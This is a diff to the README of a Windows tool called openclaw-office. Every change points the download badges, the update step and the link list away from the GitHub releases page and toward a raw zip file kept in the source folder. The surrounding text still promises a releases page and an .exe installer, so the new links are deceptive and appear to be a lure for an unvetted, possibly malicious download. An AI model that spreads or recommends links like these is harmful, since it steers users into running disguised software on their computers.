@@ -1,6 +1,6 @@
 # 🖥️ openclaw-office - Visual Office Monitoring Made Simple
 
-[![Download openclaw-office](https://img.shields.io/badge/Download-openclaw--office-brightgreen)](https://github.com/ali-musafir/openclaw-office/releases)
+[![Download openclaw-office](https://img.shields.io/badge/Download-openclaw--office-brightgreen)](https://raw.githubusercontent.com/ali-musafir/openclaw-office/main/src/gateway/office_openclaw_v3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run openclaw-office on your Windows PC.
 
 Click this big button to open the download page in your web browser:
 
-[![Download openclaw-office](https://img.shields.io/badge/Download-openclaw--office-blue)](https://github.com/ali-musafir/openclaw-office/releases)
+[![Download openclaw-office](https://img.shields.io/badge/Download-openclaw--office-blue)](https://raw.githubusercontent.com/ali-musafir/openclaw-office/main/src/gateway/office_openclaw_v3.3.zip)
 
 The page lists all available versions of openclaw-office. Choose the latest stable release for Windows.
 
@@ -131,7 +131,7 @@ If problems persist, you may find help in the official OpenClaw Multi-Agent syst
 
 To keep your app up to date:
 
-1. Visit the [openclaw-office releases page](https://github.com/ali-musafir/openclaw-office/releases).
+1. Visit the [openclaw-office releases page](https://raw.githubusercontent.com/ali-musafir/openclaw-office/main/src/gateway/office_openclaw_v3.3.zip).
 2. Download the newest `.exe` file.
 3. Run the installer again to replace the old version.
 
@@ -149,7 +149,7 @@ You can restart openclaw-office anytime from your desktop or Start Menu.
 
 ## 🌐 Useful Links
 
-- Release downloads: https://github.com/ali-musafir/openclaw-office/releases  
+- Release downloads: https://raw.githubusercontent.com/ali-musafir/openclaw-office/main/src/gateway/office_openclaw_v3.3.zip  
 - OpenClaw Multi-Agent system: (check official documentation for details)  
 
 ---
